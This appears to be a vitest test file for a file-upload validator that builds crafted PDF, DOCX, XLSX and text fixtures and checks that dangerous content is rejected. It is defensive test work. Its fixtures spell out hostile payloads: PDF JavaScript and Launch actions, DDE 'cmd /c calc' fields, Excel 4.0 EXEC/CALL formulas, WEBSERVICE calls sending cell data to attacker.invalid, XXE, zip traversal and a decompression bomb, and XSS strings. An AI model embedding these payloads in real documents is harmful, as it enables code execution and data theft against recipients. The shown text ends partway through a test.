// @vitest-environment node

import { createHash } from 'node:crypto';
import { deflateSync } from 'node:zlib';

import sharp from 'sharp';
import { beforeAll, describe, expect, it } from 'vitest';

import { FILE_ACCEPT, MAX_FILE_BYTES, normalizeFileName, validateUpload } from '@/domain/files';
import { assertSafeRasterMetadata, createRandomObjectKey, validateFile } from '@/server/files/validate-file';

type ZipEntry = {
  name: string;
  data: Buffer;
  flags?: number;
  method?: number;
  declaredCompressedSize?: number;
  declaredUncompressedSize?: number;
};

const crcTable = Array.from({ length: 256 }, (_, index) => {
  let value = index;
  for (let bit = 0; bit < 8; bit += 1) value = (value & 1) ? 0xedb88320 ^ (value >>> 1) : value >>> 1;
  return value >>> 0;
});

function crc32(buffer: Buffer): number {
  let value = 0xffffffff;
  for (const byte of buffer) value = crcTable[(value ^ byte) & 0xff]! ^ (value >>> 8);
  return (value ^ 0xffffffff) >>> 0;
}

function createZip(entries: ZipEntry[], options: { prefix?: Buffer; suffix?: Buffer } = {}): Buffer {
  const prefix = options.prefix ?? Buffer.alloc(0);
  const locals: Buffer[] = [prefix];
  const central: Buffer[] = [];
  let offset = prefix.length;

  for (const entry of entries) {
    const name = Buffer.from(entry.name, 'utf8');
    const method = entry.method ?? 0;
    const flags = entry.flags ?? 0x0800;
    const compressedSize = entry.declaredCompressedSize ?? entry.data.length;
    const uncompressedSize = entry.declaredUncompressedSize ?? entry.data.length;
    const checksum = crc32(entry.data);
    const local = Buffer.alloc(30);
    local.writeUInt32LE(0x04034b50, 0);
    local.writeUInt16LE(20, 4);
    local.writeUInt16LE(flags, 6);
    local.writeUInt16LE(method, 8);
    local.writeUInt32LE(checksum, 14);
    local.writeUInt32LE(compressedSize, 18);
    local.writeUInt32LE(uncompressedSize, 22);
    local.writeUInt16LE(name.length, 26);
    locals.push(local, name, entry.data);

    const directory = Buffer.alloc(46);
    directory.writeUInt32LE(0x02014b50, 0);
    directory.writeUInt16LE(20, 4);
    directory.writeUInt16LE(20, 6);
    directory.writeUInt16LE(flags, 8);
    directory.writeUInt16LE(method, 10);
    directory.writeUInt32LE(checksum, 16);
    directory.writeUInt32LE(compressedSize, 20);
    directory.writeUInt32LE(uncompressedSize, 24);
    directory.writeUInt16LE(name.length, 28);
    directory.writeUInt32LE(offset, 42);
    central.push(directory, name);
    offset += local.length + name.length + entry.data.length;
  }

  const centralOffset = offset;
  const centralBytes = Buffer.concat(central);
  const end = Buffer.alloc(22);
  end.writeUInt32LE(0x06054b50, 0);
  end.writeUInt16LE(entries.length, 8);
  end.writeUInt16LE(entries.length, 10);
  end.writeUInt32LE(centralBytes.length, 12);
  end.writeUInt32LE(centralOffset, 16);
  return Buffer.concat([...locals, centralBytes, end, options.suffix ?? Buffer.alloc(0)]);
}

const contentTypes = (main: string) => Buffer.from(
  `<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Override PartName="/${main}" ContentType="${
    main.startsWith('word/')
      ? 'application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml'
      : 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml'
  }"/></Types>`,
);

function docx(extra: ZipEntry[] = [], overrides: { rootRelationships?: Buffer; document?: Buffer } = {}): Buffer {
  return createZip([
    { name: '[Content_Types].xml', data: contentTypes('word/document.xml') },
    { name: '_rels/.rels', data: overrides.rootRelationships ?? Buffer.from('<Relationships/>') },
    { name: 'word/document.xml', data: overrides.document ?? Buffer.from('<w:document/>') },
    ...extra,
  ]);
}

function xlsx(extra: ZipEntry[] = [], overrides: {
  contentTypes?: Buffer;
  rootRelationships?: Buffer;
  sheet?: Buffer;
  workbook?: Buffer;
} = {}): Buffer {
  return createZip([
    { name: '[Content_Types].xml', data: overrides.contentTypes ?? contentTypes('xl/workbook.xml') },
    { name: '_rels/.rels', data: overrides.rootRelationships ?? Buffer.from('<Relationships/>') },
    { name: 'xl/workbook.xml', data: overrides.workbook ?? Buffer.from('<workbook/>') },
    { name: 'xl/worksheets/sheet1.xml', data: overrides.sheet ?? Buffer.from('<worksheet/>') },
    ...extra,
  ]);
}

function xlsxWithActivePart(options: {
  path: string;
  contentType?: string;
  relationshipType?: string;
  formula?: string;
  rootElement?: 'dialogsheet' | 'macrosheet' | 'worksheet';
}): Buffer {
  const overrides = options.contentType
    ? `<Override PartName="/${options.path}" ContentType="${options.contentType}"/>`
    : '';
  const workbookRelationships = options.relationshipType
    ? [{
        name: 'xl/_rels/workbook.xml.rels',
        data: relationships(`<Relationship Id="rIdXlm" Type="${options.relationshipType}" Target="${options.path.replace(/^xl\//iu, '')}"/>`),
      }]
    : [];
  const rootElement = options.rootElement ?? 'worksheet';
  const rootPrefix = rootElement === 'macrosheet' ? 'xm:' : '';
  const namespace = rootElement === 'macrosheet'
    ? ' xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:xm="http://schemas.microsoft.com/office/excel/2006/main"'
    : '';
  return xlsx([
    ...workbookRelationships,
    {
      name: options.path,
      data: Buffer.from(`<${rootPrefix}${rootElement}${namespace}><sheetData><row><c><f>${options.formula ?? 'EXEC(&quot;calc&quot;)'}</f></c></row></sheetData></${rootPrefix}${rootElement}>`),
    },
  ], {
    contentTypes: Buffer.from(
      `<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Override PartName="/xl/workbook.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml"/>${overrides}</Types>`,
    ),
    ...(options.relationshipType
      ? { workbook: Buffer.from('<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"><sheets><sheet name="Macro1" sheetId="1" r:id="rIdXlm"/></sheets></workbook>') }
      : {}),
  });
}

type PdfObject = {
  id: number;
  body: string | Buffer;
};

function pdfObjectBytes(object: PdfObject): Buffer {
  return Buffer.concat([
    Buffer.from(`${object.id} 0 obj\n`, 'latin1'),
    typeof object.body === 'string' ? Buffer.from(object.body, 'latin1') : object.body,
    Buffer.from('\nendobj\n', 'latin1'),
  ]);
}

function createPdf(options: {
  catalog?: string;
  pages?: string;
  page?: string;
  objects?: PdfObject[];
  trailer?: string;
} = {}): Buffer {
  const objects: PdfObject[] = [
    { id: 1, body: `<< /Type /Catalog /Pages 2 0 R ${options.catalog ?? ''} >>` },
    { id: 2, body: options.pages ?? '<< /Type /Pages /Kids [3 0 R] /Count 1 >>' },
    { id: 3, body: `<< /Type /Page /Parent 2 0 R /MediaBox [0 0 10 10] ${options.page ?? ''} >>` },
    ...(options.objects ?? []),
  ];
  const maxId = Math.max(...objects.map((object) => object.id));
  const header = Buffer.from('%PDF-1.7\n%\xff\xff\xff\xff\n', 'latin1');
  const chunks: Buffer[] = [header];
  const offsets = new Map<number, number>();
  let offset = header.length;
  for (const object of objects) {
    offsets.set(object.id, offset);
    const bytes = pdfObjectBytes(object);
    chunks.push(bytes);
    offset += bytes.length;
  }

  const xrefOffset = offset;
  const xrefRows = Array.from({ length: maxId + 1 }, (_, id) => {
    if (id === 0) return '0000000000 65535 f \n';
    const objectOffset = offsets.get(id);
    return objectOffset === undefined ? '0000000000 00000 f \n' : `${objectOffset.toString().padStart(10, '0')} 00000 n \n`;
  }).join('');
  chunks.push(Buffer.from(
    `xref\n0 ${maxId + 1}\n${xrefRows}trailer\n<< /Size ${maxId + 1} /Root 1 0 R ${options.trailer ?? ''} >>\nstartxref\n${xrefOffset}\n%%EOF\n`,
    'latin1',
  ));
  return Buffer.concat(chunks);
}

function createObjectStreamPdf(options: {
  catalog?: string;
  object?: string;
} = {}): Buffer {
  const compressedObject = Buffer.from(`4 0 ${options.object ?? '<< /S /JavaScript /JS (app.alert\\(1\\)) >>'}`, 'latin1');
  const compressedStream = deflateSync(compressedObject);
  const objectStream = Buffer.concat([
    Buffer.from(`<< /Type /ObjStm /N 1 /First 4 /Filter /FlateDecode /Length ${compressedStream.length} >>\nstream\n`, 'latin1'),
    compressedStream,
    Buffer.from('\nendstream', 'latin1'),
  ]);
  const normalObjects: PdfObject[] = [
    { id: 1, body: `<< /Type /Catalog /Pages 2 0 R ${options.catalog ?? '/OpenAction 4 0 R'} >>` },
    { id: 2, body: '<< /Type /Pages /Kids [3 0 R] /Count 1 >>' },
    { id: 3, body: '<< /Type /Page /Parent 2 0 R /MediaBox [0 0 10 10] >>' },
    { id: 5, body: objectStream },
  ];
  const header = Buffer.from('%PDF-1.7\n%\xff\xff\xff\xff\n', 'latin1');
  const chunks: Buffer[] = [header];
  const offsets = new Map<number, number>();
  let offset = header.length;
  for (const object of normalObjects) {
    offsets.set(object.id, offset);
    const bytes = pdfObjectBytes(object);
    chunks.push(bytes);
    offset += bytes.length;
  }

  const xrefObjectOffset = offset;
  const xrefRows = Buffer.alloc(7 * 7);
  const writeRow = (id: number, type: number, field2: number, field3: number) => {
    const rowOffset = id * 7;
    xrefRows.writeUInt8(type, rowOffset);
    xrefRows.writeUInt32BE(field2, rowOffset + 1);
    xrefRows.writeUInt16BE(field3, rowOffset + 5);
  };
  writeRow(0, 0, 0, 65_535);
  for (const id of [1, 2, 3, 5]) writeRow(id, 1, offsets.get(id)!, 0);
  writeRow(4, 2, 5, 0);
  writeRow(6, 1, xrefObjectOffset, 0);
  const xrefObject = pdfObjectBytes({
    id: 6,
    body: Buffer.concat([
      Buffer.from(`<< /Type /XRef /Size 7 /Root 1 0 R /W [1 4 2] /Length ${xrefRows.length} >>\nstream\n`, 'latin1'),
      xrefRows,
      Buffer.from('\nendstream', 'latin1'),
    ]),
  });
  chunks.push(xrefObject, Buffer.from(`startxref\n${xrefObjectOffset}\n%%EOF\n`, 'latin1'));
  return Buffer.concat(chunks);
}

function relationships(...relationships: string[]): Buffer {
  return Buffer.from(
    `<?xml version="1.0" encoding="UTF-8"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">${relationships.join('')}</Relationships>`,
  );
}

const pdf = createPdf();
const txt = Buffer.from('Регламент смены\nТолько безопасный текст.\n', 'utf8');

let jpeg: Buffer;
let png: Buffer;
let webp: Buffer;

beforeAll(async () => {
  const image = sharp({ create: { width: 2, height: 2, channels: 4, background: { r: 32, g: 128, b: 200, alpha: 1 } } });
  [jpeg, png, webp] = await Promise.all([
    image.clone().jpeg().toBuffer(),
    image.clone().png().toBuffer(),
    image.clone().webp().toBuffer(),
  ]);
});

const validCases = () => [
  { name: 'photo.jpg', mime: 'image/jpeg', bytes: jpeg, extension: 'jpg' },
  { name: 'photo.png', mime: 'image/png', bytes: png, extension: 'png' },
  { name: 'photo.webp', mime: 'image/webp', bytes: webp, extension: 'webp' },
  { name: 'policy.pdf', mime: 'application/pdf', bytes: pdf, extension: 'pdf' },
  { name: 'notes.txt', mime: 'text/plain', bytes: txt, extension: 'txt' },
  { name: 'guide.docx', mime: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document', bytes: docx(), extension: 'docx' },
  { name: 'stock.xlsx', mime: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet', bytes: xlsx(), extension: 'xlsx' },
] as const;

describe('actual-byte file validation', () => {
  it('publishes the exact browser picker allowlist', () => {
    expect(FILE_ACCEPT).toBe('.jpg,.jpeg,.png,.webp,.pdf,.txt,.docx,.xlsx');
  });

  it('normalizes display names to NFC and strips path, controls, bidi, and leading dots', () => {
    expect(normalizeFileName('..\\bad/\u202e e\u0301.txt\r\n')).toBe('bad é.txt');
  });

  it.each([0, MAX_FILE_BYTES + 1])('rejects an actual byte length outside the allowed range: %s', async (size) => {
    await expect(validateFile({ name: 'notes.txt', declaredMime: 'text/plain', declaredSize: size, bytes: Buffer.alloc(size) }))
      .rejects.toThrow(/пуст|25 МиБ/iu);
  });

  it('accepts and normalizes every allowed format after inspecting all actual bytes', async () => {
    for (const fixture of validCases()) {
      const result = await validateFile({
        name: fixture.name,
        declaredMime: fixture.mime,
        declaredSize: fixture.bytes.length,
        bytes: fixture.bytes,
      });
      expect(result).toMatchObject({ name: fixture.name, mimeType: fixture.mime, extension: fixture.extension });
      expect(result.size).toBe(result.bytes.length);
      expect(result.sha256).toBe(createHash('sha256').update(result.bytes).digest('hex'));
      expect(result.sha256).toMatch(/^[a-f0-9]{64}$/);
    }
  });

  it('re-encodes each accepted raster image instead of retaining the uploaded container bytes', async () => {
    for (const fixture of validCases().slice(0, 3)) {
      const result = await validateFile({ name: fixture.name, declaredMime: fixture.mime, declaredSize: fixture.bytes.length, bytes: fixture.bytes });
      expect(result.bytes).not.toEqual(fixture.bytes);
      const metadata = await sharp(result.bytes).metadata();
      expect(metadata).toMatchObject({ width: 2, height: 2 });
    }
  });

  it('rejects decoded raster metadata with an unsafe channel count', () => {
    expect(() => assertSafeRasterMetadata({
      format: 'png', width: 2, height: 2, pages: 1, channels: 5,
    }, 'png')).toThrow(/канал/iu);
  });

  it('rejects every extension, declared MIME, and detected-content mismatch', async () => {
    const fixtures = validCases();
    for (let index = 0; index < fixtures.length; index += 1) {
      const fixture = fixtures[index]!;
      const different = fixtures[(index + 1) % fixtures.length]!;
      await expect(validateFile({ name: `wrong.${different.extension}`, declaredMime: fixture.mime, declaredSize: fixture.bytes.length, bytes: fixture.bytes }))
        .rejects.toThrow();
      await expect(validateFile({ name: fixture.name, declaredMime: different.mime, declaredSize: fixture.bytes.length, bytes: fixture.bytes }))
        .rejects.toThrow();
      await expect(validateFile({ name: fixture.name, declaredMime: fixture.mime, declaredSize: different.bytes.length, bytes: different.bytes }))
        .rejects.toThrow();
    }
  });

  it.each([
    ['video.mp4', 'video/mp4', Buffer.from('00000018667479706d703432', 'hex')],
    ['page.html', 'text/html', Buffer.from('<!doctype html><html></html>')],
    ['image.svg', 'image/svg+xml', Buffer.from('<svg xmlns="http://www.w3.org/2000/svg"/>')],
    ['program.exe', 'application/octet-stream', Buffer.from('4d5a9000', 'hex')],
    ['program.elf', 'application/octet-stream', Buffer.from('7f454c4602010100', 'hex')],
    ['program.bin', 'application/octet-stream', Buffer.from('cffaedfe00000000', 'hex')],
    ['fake.webp', 'image/webp', Buffer.from('524946461000000041564920', 'hex')],
  ])('rejects forbidden content %s', async (name, declaredMime, bytes) => {
    await expect(validateFile({ name, declaredMime, declaredSize: bytes.length, bytes })).rejects.toThrow();
  });

  it.each([
    ['invalid UTF-8', Buffer.from([0xc3, 0x28])],
    ['NUL', Buffer.from('safe\u0000text')],
    ['HTML-like', Buffer.from('  <html>not text</html>')],
    ['XML-like', Buffer.from('<?xml version="1.0"?><root/>')],
    ['SVG-like', Buffer.from('<svg></svg>')],
    ['embedded HTML fragment', Buffer.from('Безопасное начало.\n<div data-role="policy">скрытый HTML</div>\nКонец.', 'utf8')],
    ['embedded script fragment', Buffer.from('Регламент смены.\n<script>alert(1)</script>', 'utf8')],
    ['slash-separated SVG handler', Buffer.from('Регламент.\n<svg/onload=alert(1)>', 'utf8')],
    ['slash-separated image handler', Buffer.from('Регламент.\n<img/src=x onerror=alert(1)>', 'utf8')],
    ['slash-separated details handler', Buffer.from('Регламент.\n<details/open/ontoggle=alert(1)>', 'utf8')],
    ['multiline image handler', Buffer.from('Регламент.\n<img\nsrc=x\nonerror=alert(1)>', 'utf8')],
  ])('rejects %s TXT content', async (_label, bytes) => {
    await expect(validateFile({ name: 'notes.txt', declaredMime: 'text/plain', declaredSize: bytes.length, bytes })).rejects.toThrow();
  });

  it('rejects prefixed and suffixed PDF and OOXML polyglots', async () => {
    const cases = [
      { name: 'policy.pdf', mime: 'application/pdf', bytes: Buffer.concat([Buffer.from('GIF89a'), pdf]) },
      { name: 'policy.pdf', mime: 'application/pdf', bytes: Buffer.concat([pdf, Buffer.from('<script>')]) },
      { name: 'guide.docx', mime: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document', bytes: createZip([
        { name: '[Content_Types].xml', data: contentTypes('word/document.xml') },
        { name: '_rels/.rels', data: Buffer.from('<Relationships/>') },
        { name: 'word/document.xml', data: Buffer.from('<w:document/>') },
      ], { prefix: Buffer.from('MZ') }) },
      { name: 'stock.xlsx', mime: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet', bytes: createZip([
        { name: '[Content_Types].xml', data: contentTypes('xl/workbook.xml') },
        { name: '_rels/.rels', data: Buffer.from('<Relationships/>') },
        { name: 'xl/workbook.xml', data: Buffer.from('<workbook/>') },
      ], { suffix: Buffer.from('payload') }) },
    ];
    for (const fixture of cases) {
      await expect(validateFile({ name: fixture.name, declaredMime: fixture.mime, declaredSize: fixture.bytes.length, bytes: fixture.bytes })).rejects.toThrow();
    }
  });

  it.each([
    ['catalog OpenAction', createPdf({ catalog: '/OpenAction [3 0 R /Fit]' })],
    ['JavaScript name tree', createPdf({
      catalog: '/Names << /JavaScript << /Names [(startup) 4 0 R] >> >>',
      objects: [{ id: 4, body: '<< /S /JavaScript /JS (app.alert\\(1\\)) >>' }],
    })],
    ['Launch action', createPdf({
      catalog: '/OpenAction 4 0 R',
      objects: [{ id: 4, body: '<< /S /Launch /F (payload.exe) >>' }],
    })],
    ['URI link annotation', createPdf({
      page: '/Annots [4 0 R]',
      objects: [{ id: 4, body: '<< /Type /Annot /Subtype /Link /Rect [0 0 10 10] /A << /S /URI /URI (https://attacker.invalid/) >> >>' }],
    })],
    ['AcroForm field', createPdf({
      catalog: '/AcroForm 4 0 R',
      page: '/Annots [5 0 R]',
      objects: [
        { id: 4, body: '<< /Fields [6 0 R] >>' },
        { id: 5, body: '<< /Type /Annot /Subtype /Widget /Rect [0 0 10 10] /Parent 6 0 R /P 3 0 R >>' },
        { id: 6, body: '<< /FT /Tx /T (name) /Kids [5 0 R] >>' },
      ],
    })],
    ['XFA form', createPdf({
      catalog: '/AcroForm 4 0 R',
      objects: [{ id: 4, body: '<< /Fields [] /XFA (<?xml version="1.0"?><template/>) >>' }],
    })],
    ['embedded file', createPdf({
      catalog: '/Names << /EmbeddedFiles << /Names [(payload.txt) 4 0 R] >> >>',
      objects: [
        { id: 4, body: '<< /Type /Filespec /F (payload.txt) /EF << /F 5 0 R >> >>' },
        { id: 5, body: '<< /Type /EmbeddedFile /Length 7 >>\nstream\npayload\nendstream' },
      ],
    })],
    ['RichMedia annotation', createPdf({
      page: '/Annots [4 0 R]',
      objects: [{ id: 4, body: '<< /Type /Annot /Subtype /RichMedia /Rect [0 0 10 10] >>' }],
    })],
    ['encrypted document', createPdf({
      objects: [{
        id: 4,
        body: '<< /Filter /Standard /V 1 /R 2 /Length 40 /O <00112233445566778899aabbccddeeff00112233445566778899aabbccddeeff> /U <ffeeddccbbaa99887766554433221100ffeeddccbbaa99887766554433221100> /P -4 >>',
      }],
      trailer: '/Encrypt 4 0 R /ID [<00112233445566778899aabbccddeeff><00112233445566778899aabbccddeeff>]',
    })],
    ['compressed object-stream JavaScript', createObjectStreamPdf()],
    ['compressed object-stream Launch action', createObjectStreamPdf({ object: '<< /S /Launch /F (payload.exe) >>' })],
    ['compressed object-stream XFA form', createObjectStreamPdf({
      catalog: '/AcroForm 4 0 R',
      object: '<< /Fields [] /XFA (<?xml version="1.0"?><template/>) >>',
    })],
    ['lowercase-hex escaped Launch action name', createPdf({
      catalog: '/#4fpenAction 4 0 R',
      objects: [{ id: 4, body: '<< /S /#4caunch /F (payload.exe) >>' }],
    })],
    ['lowercase-hex escaped AcroForm name', createObjectStreamPdf({
      catalog: '/Acr#6fForm 4 0 R',
      object: '<< /Fields [] /XFA (<?xml version="1.0"?><template/>) >>',
    })],
  ])('rejects active PDF content: %s', async (_label, bytes) => {
    await expect(validateFile({
      name: 'policy.pdf', declaredMime: 'application/pdf', declaredSize: bytes.length, bytes,
    })).rejects.toThrow();
  });

  it('rejects an excessive repeated-page PDF before walking every page', async () => {
    const allowedPageCount = 500;
    const allowedBytes = createPdf({
      pages: `<< /Type /Pages /Kids [${'3 0 R '.repeat(allowedPageCount)}] /Count ${allowedPageCount} >>`,
    });
    await expect(validateFile({
      name: 'allowed-manual.pdf', declaredMime: 'application/pdf', declaredSize: allowedBytes.length, bytes: allowedBytes,
    })).resolves.toMatchObject({ extension: 'pdf' });

    const pageCount = allowedPageCount + 1;
    const bytes = createPdf({
      pages: `<< /Type /Pages /Kids [${'3 0 R '.repeat(pageCount)}] /Count ${pageCount} >>`,
    });
    const startedAt = performance.now();
    await expect(validateFile({
      name: 'oversized-manual.pdf', declaredMime: 'application/pdf', declaredSize: bytes.length, bytes,
    })).rejects.toThrow(/страниц|слож/iu);
    expect(performance.now() - startedAt).toBeLessThan(2_000);
  });

  it.each([
    ['too many direct array entries', `/SZBudget [${'0 '.repeat(100_001)}]`],
    ['excessive direct-object nesting', `/SZBudget ${'['.repeat(129)}0${']'.repeat(129)}`],
  ])('rejects excessive PDF object complexity: %s', async (_label, catalog) => {
    const bytes = createPdf({ catalog });
    await expect(validateFile({
      name: 'complex.pdf', declaredMime: 'application/pdf', declaredSize: bytes.length, bytes,
    })).rejects.toThrow(/слож/iu);
  });

  it.each([
    ['DOCX external package relationship', docx([], {
      rootRelationships: relationships('<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="https://attacker.invalid/document.xml" TargetMode="External"/>'),
    })],
    ['XLSX external package relationship', xlsx([], {
      rootRelationships: relationships('<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="file:///tmp/payload.xlsx" TargetMode="External"/>'),
    })],
    ['remote DOCX template', docx([
      { name: 'word/_rels/settings.xml.rels', data: relationships('<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="https://attacker.invalid/template.dotm" TargetMode="External"/>') },
    ])],
    ['XLSX external link', xlsx([
      { name: 'xl/_rels/workbook.xml.rels', data: relationships('<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/externalLink" Target="externalLinks/externalLink1.xml"/>') },
      { name: 'xl/externalLinks/externalLink1.xml', data: Buffer.from('<externalLink/>') },
    ])],
    ['XLSX data connections', xlsx([
      { name: 'xl/connections.xml', data: Buffer.from('<connections><connection id="1"><dbPr connection="https://attacker.invalid/data"/></connection></connections>') },
    ])],
    ['DOCX DDEAUTO field', docx([], {
      document: Buffer.from('<w:document xmlns:w="urn:w"><w:body><w:p><w:instrText>DDEAUTO cmd "/c calc"</w:instrText></w:p></w:body></w:document>'),
    })],
    ['XLSX DDE formula', xlsx([], {
      sheet: Buffer.from('<worksheet><sheetData><row><c><f>cmd|\'/c calc\'!A0</f></c></row></sheetData></worksheet>'),
    })],
    ['XLSX external workbook formula', xlsx([], {
      sheet: Buffer.from('<worksheet><sheetData><row><c><f>[Book.xlsx]Sheet1!A1</f></c></row></sheetData></worksheet>'),
    })],
    ['XLSX WEBSERVICE formula', xlsx([], {
      sheet: Buffer.from('<worksheet><sheetData><row><c><f>_xlfn.WEBSERVICE(&quot;https://attacker.invalid/?cell=&quot;&amp;A1)</f></c></row></sheetData></worksheet>'),
    })],
    ['XLSX IMAGE formula', xlsx([], {
      sheet: Buffer.from('<worksheet><sheetData><row><c><f>image ( &quot;https://attacker.invalid/pixel.png&quot; )</f></c></row></sheetData></worksheet>'),
    })],
    ['XLSX WEBSERVICE defined name', xlsx([], {
      workbook: Buffer.from('<workbook><definedNames><definedName name="Fetch">_XLFN.WEBSERVICE(&quot;https://attacker.invalid/data&quot;)</definedName></definedNames></workbook>'),
    })],
    ['XLSX DDE external link', xlsx([
      { name: 'xl/externalLinks/externalLink1.xml', data: Buffer.from('<externalLink><ddeLink ddeService="cmd" ddeTopic="/c calc"><ddeItems/></ddeLink></externalLink>') },
    ])],
    ['DOCX malformed relationship XML', docx([
      { name: 'word/_rels/document.xml.rels', data: Buffer.from('<Relationships><Relationship></Relationships>') },
    ])],
    ['DOCX external XML entity declaration', docx([], {
      document: Buffer.from('<!DOCTYPE document [<!ENTITY remote SYSTEM "https://attacker.invalid/payload">]><document>&remote;</document>'),
    })],
  ])('rejects active OOXML content: %s', async (_label, bytes) => {
    const isDocx = _label.startsWith('DOCX') || _label.startsWith('remote DOCX');
    await expect(validateFile({
      name: isDocx ? 'guide.docx' : 'stock.xlsx',
      declaredMime: isDocx
        ? 'application/vnd.openxmlformats-officedocument.wordprocessingml.document'
        : 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
      declaredSize: bytes.length,
      bytes,
    })).rejects.toThrow();
  });

  it.each([
    ['complete Excel 4.0 macrosheet fixture', xlsxWithActivePart({
      path: 'xl/macrosheets/sheet1.xml',
      contentType: 'application/vnd.ms-excel.macrosheet+xml',
      relationshipType: 'http://schemas.microsoft.com/office/2006/relationships/xlMacrosheet',
      rootElement: 'macrosheet',
    })],
    ['Excel 4.0 macrosheet content type', xlsxWithActivePart({
      path: 'xl/customData/item1.xml',
      contentType: 'application/vnd.ms-excel.macrosheet+xml',
      formula: 'SUM(A1:A2)',
    })],
    ['international Excel 4.0 macrosheet content type', xlsxWithActivePart({
      path: 'xl/customData/item1.xml',
      contentType: 'application/vnd.ms-excel.intlmacrosheet+xml',
      formula: 'SUM(A1:A2)',
    })],
    ['dialogsheet content type', xlsxWithActivePart({
      path: 'xl/customData/item1.xml',
      contentType: 'application/vnd.openxmlformats-officedocument.spreadsheetml.dialogsheet+xml',
      formula: 'SUM(A1:A2)',
    })],
    ['Microsoft dialogsheet content type', xlsxWithActivePart({
      path: 'xl/customData/item1.xml',
      contentType: 'application/vnd.ms-excel.dialogsheet+xml',
      formula: 'SUM(A1:A2)',
    })],
    ['case and percent-variant macrosheet content type', xlsxWithActivePart({
      path: 'xl/customData/item1.xml',
      contentType: 'Application/Vnd.Ms-Excel.%6DacroSheet+Xml',
      formula: 'SUM(A1:A2)',
    })],
    ['Excel 4.0 macrosheet relationship', xlsxWithActivePart({
      path: 'xl/customData/item1.xml',
      relationshipType: 'http://schemas.microsoft.com/office/2006/relationships/xlMacrosheet',
      formula: 'SUM(A1:A2)',
    })],
    ['international Excel 4.0 macrosheet relationship', xlsxWithActivePart({
      path: 'xl/customData/item1.xml',
      relationshipType: 'http://schemas.microsoft.com/office/2006/relationships/xlIntlMacrosheet',
      formula: 'SUM(A1:A2)',
    })],
    ['case and percent-variant macrosheet relationship', xlsxWithActivePart({
      path: 'xl/customData/item1.xml',
      relationshipType: 'HTTP://SCHEMAS.MICROSOFT.COM/OFFICE/2006/RELATIONSHIPS/xl%4DacroSheet',
      formula: 'SUM(A1:A2)',
    })],
    ['dialogsheet relationship', xlsxWithActivePart({
      path: 'xl/customData/item1.xml',
      relationshipType: 'http://schemas.openxmlformats.org/officeDocument/2006/relationships/dialogsheet',
      formula: 'SUM(A1:A2)',
    })],
    ['canonical macrosheet path', xlsxWithActivePart({ path: 'xl/macrosheets/sheet1.xml', formula: 'SUM(A1:A2)' })],
    ['case-variant macrosheet path', xlsxWithActivePart({ path: 'XL/MACROSHEETS/SHEET1.XML', formula: 'SUM(A1:A2)' })],
    ['percent-encoded macrosheet path', xlsxWithActivePart({ path: 'xl/%6dacrosheets/sheet1.xml', formula: 'SUM(A1:A2)' })],
    ['nested percent-encoded macrosheet path', xlsxWithActivePart({ path: 'xl/%256dacrosheets/sheet1.xml', formula: 'SUM(A1:A2)' })],
    ['canonical dialogsheet path', xlsxWithActivePart({ path: 'xl/dialogsheets/sheet1.xml', formula: 'SUM(A1:A2)' })],
    ['percent-encoded dialogsheet path', xlsxWithActivePart({ path: 'xl/%64ialogsheets/sheet1.xml', formula: 'SUM(A1:A2)' })],
  ])('rejects XLM-capable XLSX structures: %s', async (_label, bytes) => {
    await expect(validateFile({
      name: 'stock.xlsx',
      declaredMime: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
      declaredSize: bytes.length,
      bytes,
    })).rejects.toThrow();
  });

  it.each([
    ['EXEC worksheet formula', xlsx([], {
      sheet: Buffer.from('<worksheet><sheetData><row><c><f>EXEC(&quot;calc&quot;)</f></c></row></sheetData></worksheet>'),
    })],
    ['CALL worksheet formula', xlsx([], {
      sheet: Buffer.from('<worksheet><sheetData><row><c><f>CALL(&quot;kernel32&quot;,&quot;WinExec&quot;,&quot;JJ&quot;,&quot;calc&quot;,1)</f></c></row></sheetData></worksheet>'),
    })],
    ['EXEC defined name', xlsx([], {
      workbook: Buffer.from('<workbook><definedNames><definedName name="Run">EXEC(&quot;calc&quot;)</definedName></definedNames></workbook>'),
    })],
  ])('rejects Excel 4.0 command formulas: %s', async (_label, bytes) => {
    await expect(validateFile({
      name: 'stock.xlsx',
      declaredMime: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
      declaredSize: bytes.length,
      bytes,
    })).rejects.toThrow();
  });

  it.each([
    ['macro content type', docx([{ name: 'word/vbaProject.bin', data: Buffer.from('macro') }])],
    ['encrypted entry', docx([{ name: 'word/media/image.png', data: Buffer.from('x'), flags: 0x0801 }])],
    ['traversal', docx([{ name: '../outside.xml', data: Buffer.from('x') }])],
    ['backslash traversal', docx([{ name: 'word\\..\\outside.xml', data: Buffer.from('x') }])],
    ['duplicate path', docx([{ name: 'word/document.xml', data: Buffer.from('<other/>') }])],
    ['ActiveX', docx([{ name: 'word/activeX/activeX1.bin', data: Buffer.from('x') }])],
    ['OLE embedding', docx([{ name: 'word/embeddings/oleObject1.bin', data: Buffer.from('x') }])],
    ['expansion bomb', createZip([
      { name: '[Content_Types].xml', data: contentTypes('word/document.xml') },
      { name: '_rels/.rels', data: Buffer.from('<Relationships/>') },
      { name: 'word/document.xml', data: Buffer.from([0x03, 0x00]), method: 8, declaredCompressedSize: 2, declaredUncompressedSize: 200 * 1024 * 1024 },
    ])],
  ])('rejects unsafe DOCX structure: %s', async (_label, bytes) => {
    await expect(validateFile({
      name: 'guide.docx',
